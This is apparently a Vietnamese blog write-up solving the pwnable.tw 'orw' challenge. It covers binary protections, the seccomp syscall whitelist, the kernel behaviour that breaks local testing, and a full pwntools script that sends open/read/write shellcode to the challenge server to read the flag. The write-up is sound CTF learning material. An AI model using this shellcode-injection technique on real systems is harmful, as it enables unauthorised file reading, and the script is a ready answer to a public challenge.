+++
title = 'Pwnable.tw - orw'
date = 2026-01-29T21:03:28+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## orw

`nc chall.pwnable.tw 10001`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/orw/orw
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

`main`:

```asm
08048548 <main>:
 8048559:  call   80484cb <orw_seccomp>
 8048561:  push   0x80486a0                 ; "Give my your shellcode:"
 8048566:  call   8048380 <printf@plt>
 8048571:  push   0xc8                      ; 200
 8048576:  push   0x804a060                 ; shellcode (.bss)
 804857b:  push   0x0
 804857d:  call   8048370 <read@plt>
 8048585:  mov    eax,0x804a060
 804858a:  call   eax
```

```c
int main()
{
    orw_seccomp();
    printf("Give my your shellcode:");
    read(0, shellcode, 200);
    ((void (*)())shellcode)();
}
```

Chương trình đọc 200 bytes vào buffer `shellcode` ở `0x804a060` (nằm trong `.bss`) rồi gọi luôn như con trỏ hàm. Không cần tràn, không cần leak, nhập shellcode là chạy.

#### Seccomp

`orw_seccomp` gọi `prctl(PR_SET_NO_NEW_PRIVS, 1, ...)` rồi `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)` với BPF copy từ `0x8048640`. Dump bằng `seccomp-tools`:

```bash
$ seccomp-tools dump ./orw
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

Whitelist đúng 7 syscall: `open`, `read`, `write`, `exit`, `exit_group`, `sigreturn`, `rt_sigreturn`. Còn lại trả `ERRNO(38)` = `ENOSYS`, nên `execve` chết, không lấy được shell. Đúng như tên bài, chỉ có thể `open` → `read` → `write` để in flag ra.

### 2. Khai thác

```py
shellcode = shellcraft.open('/home/orw/flag')
shellcode += shellcraft.read('eax', 'esp', 100)
shellcode += shellcraft.write(1, 'esp', 'eax')

shell = asm(shellcode)
sla(':', shell)
```

`shellcraft.open` để lại `fd` trong `eax` nên `read` lấy luôn `'eax'` làm fd, không hardcode `fd = 3`. Buffer đọc vào dùng `'esp'` cho gọn, và `write` lấy `'eax'` (số bytes `read` trả về) làm độ dài nên in ra đúng flag chứ không kèm rác.

#### Lưu ý khi test local

Chạy local trên kernel mới sẽ `SIGSEGV` chứ không in gì:

```bash
$ strace ./orw
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)  = 0
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=12, filter=0xff986fbc}) = 0
write(1, "Give my your shellcode:", 23) = 23
read(0, "placeholder", 200)             = 11
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_ACCERR, si_addr=0x804a060} ---
+++ killed by SIGSEGV (core dumped) +++
```

`SEGV_ACCERR` tại đúng `0x804a060`, tức trang đó không có quyền execute. Xem program header:

```bash
$ readelf -lW orw
  Type           VirtAddr   FileSiz MemSiz  Flg
  LOAD           0x08048000 0x007e4 0x007e4 R E
  LOAD           0x08049f08 0x00120 0x00220 RW
  GNU_STACK      0x00000000 0x00000 0x00000 RWE
```

Segment chứa `.bss` chỉ `RW`. Binary có `GNU_STACK` là `RWE`, trên kernel cũ (môi trường pwnable.tw) điều này bật `READ_IMPLIES_EXEC` cho tiến trình i386 nên mọi trang readable thành executable, kể cả `.bss`. Kernel mới đã siết lại nên `.bss` vẫn non-exec và shellcode chết tại chỗ. Bài này chạy remote được nhưng local trên kernel mới thì không, không phải do shellcode sai.

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('orw', checksec=False)
# libc = ELF('', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'i386'
context.endian = 'little'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)

def GDB():
    gdb.attach(p, gdbscript="""
        b*main+53

    """)

if args.REMOTE:
    p = remote("chall.pwnable.tw", int("10001"))
else:
    p = process([exe.path])
    if args.GDB:
        GDB()

shellcode = shellcraft.open('/home/orw/flag')
shellcode += shellcraft.read('eax', 'esp', 100)
shellcode += shellcraft.write(1, 'esp', 'eax')

shell = asm(shellcode)
sla(':', shell)

p.interactive()
```
